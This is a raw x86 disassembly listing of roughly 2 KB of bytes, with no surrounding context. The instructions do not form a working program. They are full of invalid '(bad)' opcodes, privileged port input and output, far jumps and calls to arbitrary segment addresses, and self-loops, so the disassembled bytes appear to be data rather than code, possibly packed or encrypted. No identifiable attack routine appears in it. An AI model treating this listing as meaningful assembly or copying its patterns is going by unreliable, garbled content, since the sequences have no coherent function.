  41c356:	fstp   QWORD PTR [edi+esi*8+0x2b]
  41c35a:	lock pop esi
  41c35c:	cmp    al,0xcb
  41c35e:	push   edi
  41c35f:	call   0xbb55:0x4951f236
  41c366:	sbb    eax,DWORD PTR [edi-0x22]
  41c369:	out    dx,al
  41c36a:	loopne 0x41c386
  41c36c:	adc    eax,0x79eb2dad
  41c371:	out    dx,al
  41c372:	es jb  0x41c365
  41c375:	mov    edx,0x4e9b05cc
  41c37a:	jnp    0x41c329
  41c37c:	and    eax,0x73344191
  41c381:	sbb    bl,BYTE PTR [edx+0x19]
  41c384:	fnsave [esi+0x6f]
  41c387:	or     eax,0x8550d647
  41c38c:	push   edi
  41c38d:	mov    ah,0x9a
  41c38f:	out    dx,al
  41c390:	xchg   edi,eax
  41c391:	pop    edx
  41c392:	ss (bad) 
  41c394:	retf   
  41c395:	retf   0x246f
  41c398:	and    eax,DWORD PTR [ebp+0x77b8d13a]
  41c39e:	push   ebp
  41c39f:	fnstenv [ebp+edi*2-0x3d]
  41c3a3:	test   esi,ebp
  41c3a5:	sub    DWORD PTR [edi-0x26d45e35],edi
  41c3ab:	repnz pop edx
  41c3ad:	scas   eax,DWORD PTR es:[edi]
  41c3ae:	fnstcw WORD PTR [eax]
  41c3b0:	iret   
  41c3b1:	mov    BYTE PTR [eax+0x27],cl
  41c3b4:	xor    al,0xd
  41c3b6:	fs loopne 0x41c3ad
  41c3b9:	jns    0x41c38c
  41c3bb:	mov    eax,0x11e9e002
  41c3c0:	test   al,0x7d
  41c3c2:	nop
  41c3c3:	jcxz   0x41c378
  41c3c6:	jg     0x41c3a0
  41c3c8:	fs leave 
  41c3ca:	sub    ah,BYTE PTR [esp+ecx*8]
  41c3cd:	adc    al,BYTE PTR [eax-0x2c]
  41c3d0:	cmp    DWORD PTR [edi+0x79143d10],eax
  41c3d6:	sbb    dh,BYTE PTR [eax+eiz*4+0x1f]
  41c3da:	cli    
  41c3db:	dec    esi
  41c3dc:	jecxz  0x41c441
  41c3de:	and    al,0xee
  41c3e0:	loopne 0x41c405
  41c3e2:	in     eax,dx
  41c3e3:	mov    BYTE PTR [ebx-0x3d17ee05],ch
  41c3e9:	xor    BYTE PTR [edi+0xc0c5394],cl
  41c3ef:	shl    BYTE PTR [edx-0x323d8d0b],1
  41c3f5:	cmp    BYTE PTR [ebx+0x27],bl
  41c3f8:	sub    BYTE PTR [esi-0x55],ah
  41c3fb:	movhps xmm0,QWORD PTR [eax]
  41c3fe:	push   edi
  41c3ff:	xor    eax,esp
  41c401:	test   DWORD PTR [ebx-0x6614e222],0x64198b32
  41c40b:	popa   
  41c40c:	jmp    0x9b43:0xd4fc5cfd
  41c413:	out    0xf6,eax
  41c415:	icebp  
  41c416:	pushf  
  41c417:	xchg   BYTE PTR [ebx+0x75ff5bcd],dh
  41c41d:	hlt    
  41c41e:	dec    ecx
  41c41f:	popa   
  41c420:	stos   BYTE PTR es:[edi],al
  41c421:	in     al,0x60
  41c423:	xchg   ebp,eax
  41c424:	jnp    0x41c456
  41c426:	sahf   
  41c427:	jmp    0x3b335254
  41c42c:	cli    
  41c42d:	scas   al,BYTE PTR es:[edi]
  41c42e:	shl    esi,cl
  41c430:	test   DWORD PTR [eax-0x21],eax
  41c433:	adc    eax,0x8a5fd9bf
  41c438:	mov    eax,0x86010789
  41c43d:	test   DWORD PTR [ebx-0x62338e3d],edi
  41c443:	pop    edx
  41c444:	inc    eax
  41c445:	mov    ah,0xf1
  41c447:	mov    ds:0xf5312ff4,al
  41c44c:	fld    QWORD PTR [ebx]
  41c44e:	or     eax,0xf44faeca
  41c453:	or     ah,ah
  41c455:	outs   dx,BYTE PTR ds:[esi]
  41c456:	mov    BYTE PTR [eax+edi*8+0x43],dh
  41c45a:	pminsw mm1,QWORD PTR [ebx+0x22]
  41c45e:	fwait
  41c45f:	je     0x41c4b5
  41c461:	add    cl,BYTE PTR [ebp-0x15682767]
  41c467:	add    BYTE PTR [edx+edi*4+0x79],0x88
  41c46c:	add    DWORD PTR [ecx+ecx*4+0x14],ecx
  41c470:	mov    ah,al
  41c472:	push   ebp
  41c473:	push   0xffffffd5
  41c475:	and    eax,0xca0e83b1
  41c47a:	or     dh,BYTE PTR [ebx-0x8]
  41c47d:	add    BYTE PTR [ebx+0x42cf38e7],ah
  41c483:	(bad)  
  41c484:	repz stc 
  41c486:	dec    ecx
  41c487:	in     eax,dx
  41c488:	mov    esi,0x89b70ecf
  41c48d:	bound  ebx,QWORD PTR [edi+0x6e]
  41c490:	aas    
  41c491:	dec    edx
  41c492:	pop    esi
  41c493:	fisub  DWORD PTR [edx+0x47270968]
  41c499:	in     al,0x95
  41c49b:	scas   eax,DWORD PTR es:[di]
  41c49d:	dec    ebp
  41c49e:	outs   dx,DWORD PTR ds:[esi]
  41c49f:	fcom   QWORD PTR [ebx+ebp*8-0x726b6218]
  41c4a6:	push   ss
  41c4a7:	sub    ebx,DWORD PTR [ebx-0x69675c0b]
  41c4ad:	pop    edx
  41c4ae:	mov    edi,0xacab009a
  41c4b3:	jle    0x41c4b3
  41c4b5:	iret   
  41c4b6:	sbb    eax,0x8e5458dc
  41c4bb:	int    0x54
  41c4bd:	and    esi,DWORD PTR [edx+edi*1+0x12cc6c1]
  41c4c4:	rcr    ah,cl
  41c4c6:	test   BYTE PTR [edi-0x71],ah
  41c4c9:	pop    esi
  41c4ca:	pop    es
  41c4cb:	pushf  
  41c4cc:	mov    ebx,fs
  41c4ce:	xor    BYTE PTR [ecx+0x5a],bh
  41c4d1:	jl     0x41c459
  41c4d3:	ja     0x41c4ac
  41c4d5:	inc    eax
  41c4d6:	mov    bl,0x97
  41c4d8:	adc    al,BYTE PTR [ebp+eiz*2-0x63]
  41c4dc:	rcr    BYTE PTR [edi+0x5d],0x92
  41c4e0:	sbb    eax,0x4d675b84
  41c4e5:	push   edi
  41c4e6:	loop   0x41c4f5
  41c4e8:	dec    ebx
  41c4e9:	(bad)  
  41c4ea:	adc    al,0x21
  41c4ec:	jge    0x41c560
  41c4ee:	mov    al,BYTE PTR [ebp-0x75a0e185]
  41c4f4:	jno    0x41c52d
  41c4f6:	nop
  41c4f7:	push   esi
  41c4f8:	or     DWORD PTR [eax-0x21],0x38
  41c4fc:	and    BYTE PTR [ebp+0x40],dh
  41c4ff:	push   edi
  41c500:	in     al,dx
  41c501:	xlat   BYTE PTR ds:[ebx]
  41c502:	sub    DWORD PTR [ebp-0x3461d4b9],0x451daa9d
  41c50c:	pop    ebp
  41c50d:	cmc    
  41c50e:	inc    esi
  41c50f:	fs jo  0x41c4a5
  41c512:	inc    edi
  41c513:	test   BYTE PTR [ebp-0x7d],ch
  41c516:	sub    DWORD PTR [eax+edx*8-0x2766b8ba],0x3c
  41c51e:	mov    WORD PTR [edx+0x313acf17],?
  41c524:	imul   eax,DWORD PTR [esi],0x31ca45d0
  41c52a:	dec    edx
  41c52b:	mov    ebp,0xfa26cf65
  41c530:	inc    edx
  41c531:	sahf   
  41c532:	pushf  
  41c533:	sub    eax,0x526cfa05
  41c538:	into   
  41c539:	or     BYTE PTR [edi+ecx*4+0x5718a9fb],dh
  41c540:	(bad)  
  41c541:	out    0x96,eax
  41c543:	sub    eax,DWORD PTR [edi+0x72]
  41c546:	icebp  
  41c547:	sub    ebp,ebp
  41c549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c54a:	cli    
  41c54b:	mov    ebx,0xf79fa9fb
  41c550:	aas    
  41c551:	scas   al,BYTE PTR es:[edi]
  41c552:	jl     0x41c4e4
  41c554:	adc    DWORD PTR [edi-0x5e],eax
  41c557:	inc    eax
  41c558:	mov    ecx,0x41bad8ce
  41c55d:	xchg   ebp,eax
  41c55e:	dec    esp
  41c55f:	out    0xf9,al
  41c561:	and    eax,0x275e7769
  41c566:	int    0x16
  41c568:	xor    BYTE PTR [edi-0x6dfc0808],bl
  41c56e:	fnsave [esi]
  41c570:	adc    BYTE PTR [edx],ah
  41c572:	sbb    al,0xaf
  41c574:	js     0x41c57f
  41c576:	push   ebp
  41c577:	jo     0x41c567
  41c579:	inc    esp
  41c57a:	cmp    al,BYTE PTR [edi]
  41c57c:	in     al,dx
  41c57d:	sub    DWORD PTR [esi+edx*4+0x55679673],esi
  41c584:	and    DWORD PTR [edx+0x47],edx
  41c587:	inc    ebx
  41c588:	dec    ecx
  41c589:	cs cs jo 0x41c5ea
  41c58d:	xchg   esp,eax
  41c58e:	push   eax
  41c58f:	lds    esi,FWORD PTR [ebp+0x3]
  41c592:	fisttp WORD PTR [esi+0x4834287b]
  41c598:	jmp    0xa0bd7f55
  41c59d:	mov    ds:0x2b5f296e,eax
  41c5a2:	shr    ebp,cl
  41c5a4:	xchg   ecx,eax
  41c5a5:	test   eax,0x4ec42b50
  41c5aa:	dec    eax
  41c5ab:	das    
  41c5ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5ad:	pop    ds
  41c5ae:	and    esi,esi
  41c5b0:	push   esi
  41c5b1:	fwait
  41c5b2:	push   es
  41c5b3:	add    al,0x69
  41c5b5:	mov    fs,WORD PTR [edx]
  41c5b7:	sub    ecx,DWORD PTR [ebx]
  41c5b9:	ss mov edx,0x4d48bcec
  41c5bf:	pop    eax
  41c5c0:	cmp    BYTE PTR [edx],al
  41c5c2:	and    al,0x8f
  41c5c4:	mov    edx,0x1862bdcf
  41c5c9:	jl     0x41c567
  41c5cb:	pop    edx
  41c5cc:	mov    ecx,0x84b67c3
  41c5d1:	jbe    0x41c5d0
  41c5d3:	pop    eax
  41c5d4:	sub    BYTE PTR [edx+0x477c66],0xb6
  41c5db:	outs   dx,BYTE PTR ds:[esi]
  41c5dc:	iret   
  41c5dd:	cmp    eax,0x5d2c823f
  41c5e2:	pop    ds
  41c5e3:	xor    esi,DWORD PTR [edi+ebx*2]
  41c5e6:	in     eax,dx
  41c5e7:	dec    esp
  41c5e8:	rcr    DWORD PTR [esi+0x5256af57],cl
  41c5ee:	xchg   ebx,eax
  41c5ef:	sbb    DWORD PTR [esi-0x2c],ebx
  41c5f2:	icebp  
  41c5f3:	mov    eax,ds:0x1b5531bf
  41c5f8:	xchg   esi,eax
  41c5f9:	je     0x41c5d3
  41c5fb:	(bad)  
  41c5fc:	and    BYTE PTR fs:[eax+ecx*2],dl
  41c600:	les    ebp,FWORD PTR [esi+eiz*2-0x26]
  41c604:	pusha  
  41c605:	in     eax,0x62
  41c607:	mov    ds:0xfa32a70,eax
  41c60c:	fstp   st(2)
  41c60e:	and    eax,0xd24d3abb
  41c613:	pop    ecx
  41c614:	dec    esp
  41c615:	or     DWORD PTR [edx],ebp
  41c617:	push   cs
  41c618:	retf   
  41c619:	pop    es
  41c61a:	sbb    DWORD PTR [ebp+0x24],edx
  41c61d:	mov    WORD PTR [ebx],gs
  41c61f:	lods   al,BYTE PTR ds:[esi]
  41c620:	sub    BYTE PTR [edx-0x5a477552],dh
  41c626:	jg     0x41c5c0
  41c628:	nop
  41c629:	imul   eax,DWORD PTR [eax+eiz*2],0xffffffa5
  41c62d:	sub    esi,DWORD PTR ds:0x76f6208d
  41c633:	inc    ecx
  41c634:	sar    DWORD PTR ds:0x1460a86a,1
  41c63a:	or     eax,0x87153fef
  41c63f:	cdq    
  41c640:	mov    dh,0x34
  41c642:	je     0x41c662
  41c644:	cmp    al,0x91
  41c646:	mov    dl,0x2c
  41c648:	aad    0xaa
  41c64a:	xchg   DWORD PTR [edx+ebp*1-0x4e29f81e],ecx
  41c651:	push   ebx
  41c652:	imul   edi,DWORD PTR [edx+0x35f7b8d9],0x68
  41c659:	sub    bl,BYTE PTR [edx-0x58]
  41c65c:	sub    al,0x38
  41c65e:	jg     0x41c659
  41c660:	push   edx
  41c661:	es ds pop ss
  41c664:	sub    DWORD PTR [eax-0x64],edx
  41c667:	xor    DWORD PTR [edi],ecx
  41c669:	and    edx,DWORD PTR [ebx-0x7dae1d8d]
  41c66f:	hlt    
  41c670:	sub    esp,DWORD PTR [ebp-0x37]
  41c673:	fadd   QWORD PTR es:[ecx-0x1f]
  41c677:	aaa    
  41c678:	test   ebp,0xd1203fd9
  41c67e:	fisubr DWORD PTR [eax]
  41c680:	aas    
  41c681:	sbb    BYTE PTR [esi-0x1a11f5ea],bh
  41c687:	mov    al,0xca
  41c689:	mov    dh,0x65
  41c68b:	mov    ecx,0x9388582f
  41c690:	je     0x41c65a
  41c692:	cwde   
  41c693:	pop    eax
  41c694:	and    ebx,DWORD PTR [edi]
  41c696:	leave  
  41c697:	inc    esp
  41c698:	dec    ebp
  41c699:	ins    DWORD PTR es:[edi],dx
  41c69a:	add    eax,0x46c9b163
  41c69f:	imul   eax,DWORD PTR [eax],0x129a87ed
  41c6a5:	jmp    0xd82edf7
  41c6aa:	repnz mov al,ds:0xd0638e6e
  41c6b0:	leave  
  41c6b1:	inc    edx
  41c6b2:	jo     0x41c67b
  41c6b4:	ja     0x41c699
  41c6b6:	cmc    
  41c6b7:	loop   0x41c6d7
  41c6b9:	(bad)  
  41c6ba:	mov    esi,0x6e3a9db8
  41c6bf:	test   BYTE PTR [edx+0x1dfe01da],0x73
  41c6c6:	or     edx,edx
  41c6c8:	push   ebx
  41c6c9:	shl    DWORD PTR [ecx+0x599b5685],cl
  41c6cf:	dec    ebp
  41c6d0:	xchg   ebp,eax
  41c6d1:	retf   0x7ec4
  41c6d4:	or     cl,BYTE PTR [edi+ebx*2+0x26]
  41c6d8:	adc    eax,0x19f830e1
  41c6dd:	sti    
  41c6de:	push   ebp
  41c6df:	ret    0x112b
  41c6e2:	and    DWORD PTR [esp+eiz*4-0x63],0x3306098f
  41c6ea:	nop
  41c6eb:	data16 sahf 
  41c6ed:	(bad)  
  41c6ee:	int3   
  41c6ef:	rol    BYTE PTR [edx-0x53e632d7],0x1b
  41c6f6:	aam    0xb7
  41c6f8:	and    edi,ebp
  41c6fa:	dec    esi
  41c6fb:	dec    edx
  41c6fc:	jge    0x41c712
  41c6fe:	xor    al,0xa7
  41c700:	popf   
  41c701:	sar    BYTE PTR [ecx],0xfd
  41c704:	jmp    0x41c777
  41c706:	out    dx,al
  41c707:	xchg   ecx,eax
  41c708:	adc    edi,DWORD PTR [esi+ebx*1+0x579593d]
  41c70f:	jo     0x41c721
  41c711:	fld    DWORD PTR [ebx]
  41c713:	push   eax
  41c714:	sbb    edi,eax
  41c716:	jae    0x41c790
  41c718:	mov    edx,0x1d481074
  41c71d:	fmul   DWORD PTR [edx+esi*4-0x2e]
  41c721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c722:	lds    edi,FWORD PTR ds:0xcf99d93b
  41c728:	into   
  41c729:	sub    eax,0x8a1bf1fb
  41c72e:	sub    DWORD PTR [ecx],esp
  41c730:	repz push ebx
  41c732:	(bad)  
  41c733:	pop    edi
  41c734:	push   ecx
  41c735:	dec    ecx
  41c736:	retf   0xd516
  41c739:	retf   
  41c73a:	call   0x74e9:0x57168ba0
  41c741:	xor    al,0x17
  41c743:	gs pop es
  41c745:	aas    
  41c746:	out    0xf8,al
  41c748:	jl     0x41c717
  41c74a:	js     0x41c76b
  41c74c:	xchg   esp,eax
  41c74d:	(bad)  
  41c74e:	jp     0x41c721
  41c750:	dec    sp
  41c752:	fcmovne st,st(7)
  41c754:	pop    esp
  41c755:	jg     0x41c725
  41c757:	push   esp
  41c758:	sar    DWORD PTR [esi+0x20],cl
  41c75b:	push   0xffffff9d
  41c75d:	cli    
  41c75e:	xor    eax,0xcb43b000
  41c763:	ror    BYTE PTR [ebx+0x6f],1
  41c766:	int3   
  41c767:	nop
  41c768:	mov    BYTE PTR [esi-0x64],al
  41c76b:	push   eax
  41c76c:	fld    st(5)
  41c76e:	ret    0xc0c4
  41c771:	test   BYTE PTR [esi-0x1e],ah
  41c774:	mov    bh,BYTE PTR [ebx*4+0x4e98f68]
  41c77b:	push   ebx
  41c77c:	imul   DWORD PTR [ecx+0x1]
  41c77f:	in     al,0xe
  41c781:	jl     0x41c758
  41c783:	mov    ebp,0xad0ec942
  41c788:	mov    ch,0xcb
  41c78a:	add    al,0x5d
  41c78c:	dec    ecx
  41c78d:	lea    esp,[ebp-0x299ab217]
  41c793:	mov    ebp,0x34491704
  41c798:	popf   
  41c799:	jmp    0x41c725
  41c79b:	leave  
  41c79c:	mov    edx,0xec18cd5d
  41c7a1:	pushf  
  41c7a2:	adc    eax,0xfd756d65
  41c7a7:	inc    esp
  41c7a8:	call   0xa0de:0x5057fb78
  41c7af:	xlat   BYTE PTR ds:[ebx]
  41c7b0:	dec    edi
  41c7b1:	aam    0xa8
  41c7b3:	mov    bl,0xc8
  41c7b5:	test   eax,0x9fc566cf
  41c7ba:	inc    edx
  41c7bb:	or     al,BYTE PTR [ebx]
  41c7bd:	and    al,0xa3
  41c7bf:	je     0x41c815
  41c7c1:	fsubr  QWORD PTR [edx]
  41c7c3:	or     eax,0x1218bb0b
  41c7c8:	xor    esi,DWORD PTR [edi+0x6a29fc0b]
  41c7ce:	dec    esp
  41c7cf:	cmc    
  41c7d0:	mov    dh,0x9f
  41c7d2:	sub    BYTE PTR [eax-0x5b],dl
  41c7d5:	std    
  41c7d6:	xchg   ecx,eax
  41c7d7:	push   cs
  41c7d8:	loopne 0x41c7ed
  41c7da:	out    0x38,eax
  41c7dc:	jmp    0x762b99ce
  41c7e1:	outs   dx,BYTE PTR ds:[esi]
  41c7e2:	daa    
  41c7e3:	mov    gs,WORD PTR ds:0x468d3a68
  41c7e9:	sub    al,0x52
  41c7eb:	adc    eax,0xb692a0dd
  41c7f0:	popf   
  41c7f1:	sbb    BYTE PTR [eax],bh
  41c7f3:	ds test eax,0x6a950319
  41c7f9:	mov    ah,0xf9
  41c7fb:	adc    BYTE PTR [edx+edi*1-0x31],0x6b
  41c800:	or     al,0x3f
  41c802:	mov    ds,WORD PTR [eax-0x3f]
  41c805:	dec    esi
  41c806:	(bad)  ss:[esi-0x1ee255ed]
  41c80d:	or     ah,BYTE PTR [eax+edi*2]
  41c810:	adc    DWORD PTR [eax-0x6af8ea6b],edi
  41c816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c817:	or     ebp,ebx
  41c819:	popa   
  41c81a:	pop    ebp
  41c81b:	paddusw mm0,QWORD PTR [eax]
  41c81e:	cmp    eax,0x1d16ecd0
  41c823:	jecxz  0x41c864
  41c825:	jecxz  0x41c88a
  41c827:	shl    BYTE PTR [edx],0xa6
  41c82a:	or     eax,0xfd88b21e
  41c82f:	sub    eax,0xfbed2a47
  41c834:	push   cs
  41c835:	push   es
  41c836:	(bad)  
  41c837:	ss jns 0x41c7ca
  41c83a:	push   esp
  41c83b:	jle    0x41c7d5
  41c83d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c83e:	dec    BYTE PTR [esi-0x1d8f8497]
  41c844:	fdiv   DWORD PTR cs:[ebx]
  41c847:	or     BYTE PTR [edx],dh
  41c849:	push   edi
  41c84a:	mov    ds:0xb7ae2070,al
  41c84f:	jno    0x41c841
  41c851:	or     BYTE PTR [esi-0x12],bl
  41c854:	stc    
  41c855:	loopne 0x41c7d7
  41c857:	popf   
  41c858:	xchg   DWORD PTR [ebx],ecx
  41c85a:	(bad)  
  41c85b:	fldcw  WORD PTR ss:[esi+0x1d]
  41c85f:	adc    al,0x9c
  41c861:	jmp    0x41c8bc
  41c863:	stc    
  41c864:	loopne 0x41c8bf
  41c866:	mov    edx,DWORD PTR [ebp-0x79]
  41c869:	jge    0x41c8ac
  41c86b:	mov    al,0x68
  41c86d:	(bad)  [ebp+0x76385785]
  41c873:	dec    ecx
  41c874:	aad    0xe6
  41c876:	stos   DWORD PTR es:[edi],eax
  41c877:	pop    esp
  41c878:	cld    
  41c879:	or     eax,0xb5cb589
  41c87e:	and    al,0xfa
  41c880:	idiv   ch
  41c882:	pop    ss
  41c883:	sbb    eax,0xce04e2b2
  41c888:	mov    edi,0xbdcf4eb1
  41c88d:	fisub  DWORD PTR [edx-0x22]
  41c890:	xlat   BYTE PTR ds:[ebx]
  41c891:	popa   
  41c892:	out    0x5b,al
  41c894:	inc    edi
  41c895:	add    edx,DWORD PTR [esi]
  41c897:	outs   dx,DWORD PTR ds:[esi]
  41c898:	mov    edx,0xa728ef5
  41c89d:	sbb    esi,ebx
  41c89f:	sub    DWORD PTR [eax-0x20],0xac54dc71
  41c8a6:	repz jle 0x41c8d7
  41c8a9:	aas    
  41c8aa:	cld    
  41c8ab:	das    
  41c8ac:	shl    DWORD PTR [bp+di+0x7979],0x46
  41c8b2:	ror    BYTE PTR [esp+esi*8+0x23037a8],0xe0
  41c8ba:	out    dx,al
  41c8bb:	mov    ebp,fs
  41c8bd:	pop    ecx
  41c8be:	adc    DWORD PTR [ebp+0x4b],0x4c
  41c8c2:	daa    
  41c8c3:	sub    dl,BYTE PTR [edi-0x6]
  41c8c6:	mov    bl,0x42
  41c8c8:	xchg   esi,eax
  41c8c9:	test   al,0x5f
  41c8cb:	sti    
  41c8cc:	xchg   esp,eax
  41c8cd:	add    BYTE PTR [ecx],bh
  41c8cf:	inc    ebp
  41c8d0:	addr16 mov ds:0xb101,eax
  41c8d4:	push   0xd
  41c8d6:	cli    
  41c8d7:	retf   
  41c8d8:	ficom  WORD PTR [edi]
  41c8da:	pop    ss
  41c8db:	jbe    0x41c8db
  41c8dd:	ret    
  41c8de:	cmp    dh,bh
  41c8e0:	ds std 
  41c8e2:	cmp    ebp,ebx
  41c8e4:	add    DWORD PTR [ecx],edi
  41c8e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8e7:	int    0xc5
  41c8e9:	sahf   
  41c8ea:	popa   
  41c8eb:	outs   dx,BYTE PTR ds:[esi]
  41c8ec:	adc    al,0x21
  41c8ee:	iret   
  41c8ef:	push   es
  41c8f0:	pop    esp
  41c8f1:	scas   al,BYTE PTR es:[edi]
  41c8f2:	fwait
  41c8f3:	and    eax,0x944d4629
  41c8f8:	sub    DWORD PTR ds:0xa7a1bf1c,ebp
  41c8fe:	sbb    edx,DWORD PTR [esi]
  41c900:	and    dl,BYTE PTR [edx-0x68cd7a27]
  41c906:	sub    eax,0xc15b191a
  41c90b:	ins    BYTE PTR es:[edi],dx
  41c90c:	lock and al,0x6e
  41c90f:	xor    eax,0xb747fe0
  41c914:	outs   dx,BYTE PTR ds:[esi]
  41c915:	call   0xc022:0x505f6a85
  41c91c:	loope  0x41c957
  41c91e:	xor    al,0x37
  41c920:	sub    al,0xe1
  41c922:	std    
  41c923:	push   esp
  41c924:	sub    eax,ebp
  41c926:	(bad)  
  41c927:	mov    dh,0xc1
  41c929:	and    eax,0x7d157775
  41c92e:	pop    eax
  41c92f:	test   eax,0xde06b160
  41c934:	add    DWORD PTR [ebx],0xffffffce
  41c937:	jb     0x41c8e9
  41c939:	es dec ebx
  41c93b:	xlat   BYTE PTR ds:[ebx]
  41c93c:	mov    eax,0x3e571bcd
  41c941:	dec    edx
  41c942:	sbb    ebp,DWORD PTR [ecx+0x11c4e3f4]
  41c948:	test   dl,al
  41c94a:	mov    ebx,0xa41c1a3e
  41c94f:	cmp    BYTE PTR [edx+0x6bd5d560],ah
  41c955:	xchg   esi,eax
  41c956:	xor    al,ch
  41c958:	inc    esi
  41c959:	jns    0x41c901
  41c95b:	fbld   TBYTE PTR [edx+0x60e4cec2]
  41c961:	jae    0x41c900
  41c963:	push   edx
  41c964:	(bad)  
  41c965:	shr    DWORD PTR [edi],cl
  41c967:	xor    bh,ah
  41c969:	sbb    eax,0x33fa9a07
  41c96e:	retf   
  41c96f:	dec    ecx
  41c970:	into   
  41c971:	sub    edx,DWORD PTR [ecx]
  41c973:	ins    BYTE PTR es:[edi],dx
  41c974:	cmp    dh,BYTE PTR [edx-0x1a3057b0]
  41c97a:	and    eax,0x52756aba
  41c97f:	add    BYTE PTR [ebx],bh
  41c981:	in     al,0x22
  41c983:	out    0x4b,al
  41c985:	push   esp
  41c986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c987:	push   ds
  41c988:	cmp    eax,0x2744cdba
  41c98d:	mov    bh,bl
  41c98f:	or     DWORD PTR [edi+0x10],edi
  41c992:	call   0x35f3:0xedfecef1
  41c999:	pop    edx
  41c99a:	(bad)
  41c99d:	daa    
  41c99e:	addr16 or ah,ch
  41c9a1:	stos   DWORD PTR es:[edi],eax
  41c9a2:	fbld   TBYTE PTR [ebx-0x564aa88]
  41c9a8:	mov    edx,0xda8121b7
  41c9ad:	repnz mov edi,DWORD PTR [edx]
  41c9b0:	sub    ah,bh
  41c9b2:	cdq    
  41c9b3:	mov    al,0xdb
  41c9b5:	jo     0x41c955
  41c9b7:	retf   
  41c9b8:	adc    ecx,esp
  41c9ba:	xchg   esp,eax
  41c9bb:	nop
  41c9bc:	push   edx
  41c9bd:	data16 icebp 
  41c9bf:	adc    bl,0xb8
  41c9c2:	inc    dh
  41c9c4:	pop    esp
  41c9c5:	jb     0x41c9cb
  41c9c7:	lea    edi,[esi]
  41c9c9:	mov    eax,ds:0xc3229682
  41c9ce:	out    dx,eax
  41c9cf:	jae    0x41c9c9
  41c9d1:	push   esp
  41c9d2:	push   cs
  41c9d3:	push   ebp
  41c9d4:	(bad)  
  41c9d5:	aaa    
  41c9d6:	clc    
  41c9d7:	addr16 aaa 
  41c9d9:	mov    ds,esp
  41c9db:	icebp  
  41c9dc:	push   si
  41c9de:	shl    BYTE PTR [edi+0x6e],cl
  41c9e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9e2:	xor    bh,BYTE PTR [edi]
  41c9e4:	lock test al,0x4d
  41c9e7:	loopne 0x41ca15
  41c9e9:	ins    DWORD PTR es:[edi],dx
  41c9ea:	lods   eax,DWORD PTR ds:[esi]
  41c9eb:	repz xlat BYTE PTR ds:[ebx]
  41c9ed:	ss shl cl,1
  41c9f0:	mov    bh,0x1f
  41c9f2:	stos   DWORD PTR es:[edi],eax
  41c9f3:	outs   dx,BYTE PTR ds:[esi]
  41c9f4:	cs pop eax
  41c9f6:	mov    al,0x67
  41c9f8:	mov    DWORD PTR [ebp+eiz*2+0x64],eax
  41c9fc:	xchg   dh,ch
  41c9fe:	addr16 ret 
  41ca00:	and    al,0x37
  41ca02:	ja     0x41ca36
  41ca04:	test   al,0x5
  41ca06:	add    eax,0x3a0d98f0
  41ca0b:	mov    esi,0x9fbe9d36
  41ca10:	jmp    0xfe1a:0x1f0f0f10
  41ca17:	and    ch,bl
  41ca19:	xor    al,BYTE PTR [eax]
  41ca1b:	aad    0x82
  41ca1d:	or     al,0x88
  41ca1f:	cmc    
  41ca20:	mov    esi,0x4c58ed20
  41ca25:	mov    esi,0x45c55f7c
  41ca2a:	stos   BYTE PTR es:[edi],al
  41ca2b:	test   al,0x6
  41ca2d:	loopne 0x41ca21
  41ca2f:	movntps XMMWORD PTR [ecx],xmm1
  41ca32:	mov    eax,0xd2d10037
  41ca37:	enter  0x18ce,0xdb
  41ca3b:	outs   dx,DWORD PTR ds:[esi]
  41ca3c:	mov    dh,0x5a
  41ca3e:	xchg   edi,eax
  41ca3f:	loope  0x41cab0
  41ca41:	les    edx,FWORD PTR [esi-0x34]
  41ca44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca45:	inc    ebx
  41ca46:	adc    DWORD PTR [eax],edi
  41ca48:	mov    DWORD PTR [ebx+0x3d],esp
  41ca4b:	cwde   
  41ca4c:	popa   
  41ca4d:	fst    DWORD PTR [esi+0x30]
  41ca50:	lds    edi,FWORD PTR [eax]
  41ca52:	loopne 0x41caa9
  41ca54:	xchg   esi,eax
  41ca55:	(bad)  
  41ca57:	inc    ecx
  41ca58:	adc    eax,0xba1cb7ce
  41ca5d:	pop    ss
  41ca5e:	js     0x41ca82
  41ca60:	xchg   edi,eax
  41ca61:	mov    edi,0xdf69b033
  41ca66:	fld    TBYTE PTR [esi]
  41ca68:	inc    esp
  41ca69:	(bad)
  41ca6d:	mov    edx,DWORD PTR [esi-0x69f6072a]
  41ca73:	jb     0x41ca30
  41ca75:	js     0x41cabd
  41ca77:	sub    esp,esi
  41ca79:	and    BYTE PTR [edi],ch
  41ca7b:	shl    DWORD PTR [edx+ebp*4],1
  41ca7e:	les    edx,FWORD PTR ds:0xbf293ab2
  41ca84:	sar    DWORD PTR [edx],0xae
  41ca87:	ret    
  41ca88:	or     ebp,ecx
  41ca8a:	mov    cl,0x49
  41ca8c:	cmp    esi,0xafec794d
  41ca92:	out    0x4,eax
  41ca94:	shr    BYTE PTR [edi+0x3f939382],cl
  41ca9a:	push   ds
  41ca9b:	jmp    0x41cb15
  41ca9d:	push   ss
  41ca9e:	cmp    BYTE PTR [eax-0x3],bh
  41caa1:	in     eax,0xd1
  41caa3:	psrlq  mm0,QWORD PTR [edi-0x5d81dbb9]
  41caaa:	lods   al,BYTE PTR ds:[esi]
  41caab:	loope  0x41ca8e
  41caad:	and    esi,esp
  41caaf:	mov    ch,0x6a
  41cab1:	std    
  41cab2:	jecxz  0x41ca9f
  41cab4:	pop    esi
  41cab5:	shl    BYTE PTR es:[edx-0x5b],0xca
  41caba:	jecxz  0x41ca7b
  41cabc:	add    DWORD PTR [ebp-0x59],0x26
  41cac0:	sbb    dh,BYTE PTR [eax+ebx*8+0x1eb5ed41]
  41cac7:	pop    esi
  41cac8:	and    DWORD PTR [edi],eax
  41caca:	cld    
  41cacb:	pop    edx
  41cacc:	es jl  0x41ca9f
  41cacf:	ja     0x41ca9e
  41cad1:	jno    0x41cb3a
  41cad3:	icebp  
  41cad4:	push   cs
  41cad5:	rcr    bh,1
  41cad7:	cmp    eax,0xfc2b243e
  41cadc:	push   edx
  41cadd:	inc    ebp
  41cade:	imul   ecx,DWORD PTR [esi],0x7b73ef6b
